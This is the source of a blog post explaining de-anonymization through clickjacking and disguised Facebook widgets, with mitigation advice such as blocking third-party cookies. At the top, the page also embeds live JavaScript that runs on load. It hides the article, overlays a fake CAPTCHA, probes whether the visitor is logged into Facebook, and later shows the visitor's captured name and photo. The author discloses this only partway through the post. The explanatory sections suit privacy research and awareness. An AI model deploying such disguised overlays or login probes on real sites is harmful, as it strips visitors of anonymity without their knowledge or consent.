---
layout: post
title: De-anonymization via Clickjacking in 2019
---

This blog post is about my journey to understand the current practice of de-anonymization via the clickjacking technique whereby a malicious website is able to uncover the identity of a visitor, including his full name and possibly other personal information. I don’t present any new information here that isn’t already publicly available, but I do look at how easy it is to compromise a visitor’s privacy and reveal his identity, even when he adheres to security best practices and uses an up-to-date browser and operating system.

{% raw %}<script>
function addStyle(id, styles) {
	/* Create style element */
	var css = document.createElement('style');
	css.id = id;
	css.type = 'text/css';

	if (css.styleSheet) {
		css.styleSheet.cssText = styles;
	} else {
		css.appendChild(document.createTextNode(styles));
	}

	/* Append style to the head element */
	document.getElementsByTagName("head")[0].appendChild(css);
}

function getQueryParam(name, url) {
    if (!url) url = location.href;
    name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
    var regexS = "[\\?&]"+name+"(?:=([^&#]*))?";
    var regex = new RegExp( regexS );
    var results = regex.exec( url );
    return results == null ? null : results[1];
}

function isMobileOrTablet() {
	var check = false;
	(function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
	return check;
}

function addCaptchaFrame(id, demo) {
	var iframe = document.createElement('iframe');
	iframe.id = id;
	iframe.src = '../files/De-anonymization-via-Clickjacking-in-2019/fake_captcha.html' + (demo ? '?demo' : '');
	iframe.style.position = 'absolute';
	iframe.style.left = '0';
	iframe.style.top = '0';
	iframe.style.width = '100%';
	iframe.style.height = '100%';
	iframe.style['z-index'] = '99';
	document.body.appendChild(iframe);
}

function removeElementById(id) {
	var node = document.getElementById(id);
	if (node) {
		node.parentNode.removeChild(node);
	}
}

function loadFacebookDemoData() {
	var facebookDemoData = null;
	try {
		facebookDemoData = JSON.parse(localStorage.getItem('visitor_fb_details') || 'null');
	} catch (e) {}
	
	window.facebookDemoData = facebookDemoData || {};
	return facebookDemoData !== null;
}

function onCaptchaFrameDone() {
	removeElementById('captchaFrame');
	removeElementById('hideAllDivs');
	
	loadFacebookDemoData();
	
	if (facebookDemoDataUpdateName) {
		facebookDemoDataUpdateName();
	}
	
	if (facebookDemoDataUpdateImage) {
		facebookDemoDataUpdateImage();
	}
	
	if (getQueryParam('demo') !== null) {
		if (window.facebookDemoData.name) {
			alert('Hi ' + window.facebookDemoData.name + ' :)');
		}
	}
}

function onFacebookPullScriptLoad() {
	// Probably logged into Facebook, show the demo.
	removeElementById('hideAllIframes');
}

function onFacebookPullScriptError() {
	// Probably not logged into Facebook or blocking third party cookies. Give up on the demo.
	removeElementById('captchaFrame');
	removeElementById('hideAllDivs');
	removeElementById('hideAllIframes');
}

var sawCaptcha = false;
try {
	if (localStorage.getItem('saw_fake_captcha')) {
		sawCaptcha = true;
	}
} catch (e) {}

if (getQueryParam('demo') !== null) {
	addStyle('hideAllDivs', 'div { display: none; }');
	addCaptchaFrame('captchaFrame', true);
} else if (!sawCaptcha && !isMobileOrTablet()) {
	addStyle('hideAllDivs', 'div { display: none; }');
	addStyle('hideAllIframes', 'iframe { display: none; }');
	addCaptchaFrame('captchaFrame', false);
	document.write('<script type="text/javascript"' +
		' src="https://0-edge-chat.facebook.com/pull?clientid="' +
		' onload="onFacebookPullScriptLoad()"' +
		' onerror="onFacebookPullScriptError()"' +
		' async="async"></scr' + 'ipt>');
}

loadFacebookDemoData();
</script>{% endraw %}

# Initial Motivation - Google YOLO

My journey began when I read the excellent [Google YOLO blog post](https://blog.innerht.ml/google-yolo/) by [@filedescriptor](https://twitter.com/filedescriptor) about a clickjacking vulnerability of the Google YOLO (You Only Login Once) service, a web widget that provides an embeddable one-click login on websites. I highly recommend that you read the blog post, which includes an interactive demonstration of the clickjacking technique.

The blog post discusses how the widget can be used as a privacy threat, explaining that it’s possible to build a website with the Google YOLO widget and disguise the widget to make it look like a harmless button. When the seemingly harmless button is clicked, the victim unknowingly logs into the website with his Google account, and thus passes his identity, including his full name and email address, to the owner of the website.

However, since most websites you use probably know your identity anyway, that’s not the most serious issue, but it can still backfire. Think, for example, about completing a sensitive survey which claims to be anonymous. Since you never logged in to the survey website you might think that it has no way of connecting your answers to your identity, but this might not be the case.

By the time I read the Google YOLO blog post, the issue had already been [fixed by Google](https://twitter.com/sirdarckcat/status/994867137704587264) by limiting the YOLO service to a list of partners.

The blog post also demonstrates clickjacking with the Facebook Like widget, but when I tried it, it asked for a confirmation, like this:

![Facebook Like widget confirmation]({{ site.baseurl }}/images/De-anonymization-via-Clickjacking-in-2019/Facebook-Like-widget-confirmation.gif)

The confirmation request makes the clickjacking attack infeasible - even if the victim clicks on the Like button two times unknowingly, he will still have to confirm his action in the newly opened popup window. The popup, being an entirely new window, cannot be manipulated by the attacker’s website, and is not prone to clickjacking. The downside is that the solution hurts usability, requiring additional actions every time, even for legit Like button usage.

So it looked to me that the issue had been fixed by the major companies, and I forgot about it for a while, until I had an idea…

# The Facebook Comments Widget: “Typejacking”

One day while I was browsing the web, I stumbled upon a website which used the [Facebook Comments plugin](https://developers.facebook.com/docs/plugins/comments) to allow visitors to comment on its website articles at the bottom of the page. At that moment, I remembered what I had read on the Google YOLO blog post about clickjacking, and had the following thought: clickjacking can’t be applied on major services anymore, but what about “typejacking”? What if I take the comments plugin and embed it on my website, disguising it as a form with a different purpose? Then, when the unsuspecting victim comes along and inserts text, any text, and submits it as a Facebook comment on my page, I can learn his identity by checking which Facebook account just posted the comment.

So I started working on a proof of concept web page that demonstrates the technique. While working on it and trying various approaches, I accidentally found out that the Like widget, the one that I thought required a confirmation, works without a confirmation on my website! Reading about the Facebook Like widget on the Internet, I found out that Facebook, unlike Google, uses a blacklist to apply protection from clickjacking.

While the method Facebook chose to protect its users from clickjacking can guard against a mass harvesting of likes - they can notice that a large amount of likes came from a single website - and even undo the likes, it doesn’t protect users from the de-anonymization threat. An attacker can easily create a new website and use clickjacking with the Like widget, and then send the page to a limited amount of victims and reveal their identities by tracking the likes on Facebook.

To my surprise, the likejacking technique, which is the term applied to the strategy of using clickjacking to gain likes, has been around [at least since 2010](https://www.computerworld.com/article/2518461/facebook--likejacking--attacks-continue-with-flesh-appeal.html). And today, 9 years later, it’s still an issue. Also, when talking about likejacking, people rarely mention the de-anonymization issue. While it was mentioned [at least as early](https://staging.whitehatsec.com/blog/i-know-your-name-and-probably-a-whole-lot-more-deanonymization-via-likejacking-followjacking-etc/) as [2012](https://www.usenix.org/sites/default/files/conference/protected-files/huang_usenixsecurity12_slides.pdf), I think that there isn’t enough awareness about it, especially nowadays when more and more people have begun to understand the importance of online privacy.

<img id="facebookDemoDataThumbSrc" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" style="display:none;width:48px;height:48px;float:left;margin-right:8px;">

{% raw %}<script>
function facebookDemoDataUpdateImage() {
	var facebookDemoDataThumbSrc = document.getElementById('facebookDemoDataThumbSrc');
	if (window.facebookDemoData.thumbSrc) {
		facebookDemoDataThumbSrc.src = window.facebookDemoData.thumbSrc;
		facebookDemoDataThumbSrc.style.display = null;
	} else {
		facebookDemoDataThumbSrc.style.display = 'none';
	}
}
facebookDemoDataUpdateImage();
</script>{% endraw %}

By the way, regarding that typejacking proof of concept - you might have seen a CAPTCHA that you had to enter to be able to see the article. You’ve probably figured out by now that it wasn’t a real CAPTCHA<span id="facebookDemoDataName"></span>{::nomarkdown}{% raw %}<script>
function facebookDemoDataUpdateName() {
	var facebookDemoDataName = document.getElementById('facebookDemoDataName');
	facebookDemoDataName.textContent = window.facebookDemoData.name ? ', ' + window.facebookDemoData.name + ' :)' : '.';
}
facebookDemoDataUpdateName();
</script>{% endraw %}{:/} If you missed it, you can see a demonstration video [here]({{ site.baseurl }}/images/De-anonymization-via-Clickjacking-in-2019/Attack-demonstration.mp4). You can also play with the proof of concept page [here](./?demo), this time with a checkbox to reveal the disguised widget.

# Beyond Clickjacking and Typejacking

Thinking about the concept of clickjacking, I was wondering what else can be done by exploiting the ability to embed and manipulate a third party widget on a malicious website. The clickjacking and typejacking techniques trick the user into interacting with the widget. What if we trick the user into getting information from the widget instead?

Apparently somebody thought about that, too. A quick search led me to the paper [Tell Me About Yourself: The Malicious CAPTCHA Attack](https://www.researchgate.net/publication/288280540_Tell_Me_About_Yourself_The_Malicious_CAPTCHA_Attack) which analyzes this technique. Here’s an example from the paper that demonstrates how an attacker can trick the victim into unknowingly revealing his own name by masking the widget as a sneaky CAPTCHA:

![Facebook Comments widget masked as CAPTCHA]({{ site.baseurl }}/images/De-anonymization-via-Clickjacking-in-2019/Facebook-Comments-widget-masked-as-CAPTCHA.png)

# Clickjacking Prevention for Website Owners

As of today, there’s still no reliable way to prevent clickjacking.

In 2009, the **X-Frame-Options** HTTP header was introduced, which offers a partial protection against clickjacking. The header allows a website owner to specify which pages shouldn’t be framed. A browser which is aware of the header will refuse to load these pages in a frame. While this prevents clickjacking in several cases, it doesn’t help with widgets which are meant to be framed, such as the Like widget or the comments widget.

Looking at the **X-Frame-Options** header, I thought, why not make a similar prevention measure which still allows framing? Think about the Like widget, for example: Is there any reason for a web page to draw over the widget? To change its size and opacity? To do any other manipulations such as CSS filters? The only reason I can think of is clickjacking. So why not introduce a new **X-Frame-Options** option such as **X-Frame-Options: Isolate**, which will allow framing, but will make sure that the frame cannot be tampered with and that the parent website cannot draw over it? As with my previous ideas, [I wasn’t the first one to come up with this idea](http://homakov.blogspot.com/2014/09/bypassing-clearclick-and-x-frame.html).

Until browsers implement such a protection, website owners have only one option: to require extra user interaction, possibly with an isolated popup window. We’ve seen that Facebook does this with the Like widget, but only for suspicious websites hosting the widget. Apparently Facebook values users’ usability more than their privacy.

# Clickjacking Mitigation for Users

Having tried several solutions, I came to the conclusion that blocking third party cookies is the best mitigation for clickjacking. It doesn’t prevent clickjacking per se, but since the embedded frame won’t be receiving the visitor’s cookies, the attacker won’t be able to do much harm.

What’s great about blocking third party cookies is that most browsers have an option to do it out of the box. No need to install third party extensions, or look for different solutions for different browsers or devices.

The downside is that legit widgets, such as the Like widget or the comment widget, will stop working. I don’t remember missing any of those, but of course your mileage may vary.

Another advantage of blocking third party cookies is that it can protect from side channel attacks, which don’t require user interaction. For example, [this technique](https://www.evonide.com/side-channel-attacking-browsers-through-css3-features/) demonstrates usage of a CSS3 feature to de-anonymize Facebook users with no additional user interaction. Another example of an old, but interesting vulnerability that would be prevented by blocking third party cookies is [generic cross-browser cross-domain theft](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html) ([relevant Chromium issue](https://bugs.chromium.org/p/chromium/issues/detail?id=9877)).

# Summary

If nothing else, there’s one thing I want you to take away from this blog post: consider blocking third party cookies in order to protect your identity online. [Here’s one](https://www.digitalcitizen.life/how-disable-third-party-cookies-all-major-browsers) of the many guides that show how to block third party cookies in various browsers.

I hope that this blog post will help raise awareness about the ongoing issue of clickjacking which has remained unsolved since 2010. Perhaps browser vendors will consider implementing a prevention measure to limit frame manipulation.
